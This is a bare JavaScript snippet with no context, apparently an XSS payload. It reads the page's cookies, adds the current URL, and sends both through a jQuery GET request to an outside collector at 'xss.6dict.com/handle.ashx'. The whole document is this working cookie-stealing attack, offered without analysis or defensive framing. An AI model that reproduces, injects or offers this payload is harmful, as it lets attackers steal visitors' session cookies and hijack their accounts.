(function(){

  var cookie=document.cookie;
  var l=cookie.replace("?","%3F")+"; url="+encodeURIComponent(window.location.href);
  setTimeout(function(){
  	$.get("http://xss.6dict.com/handle.ashx?c="+l);
  },5)
  
})();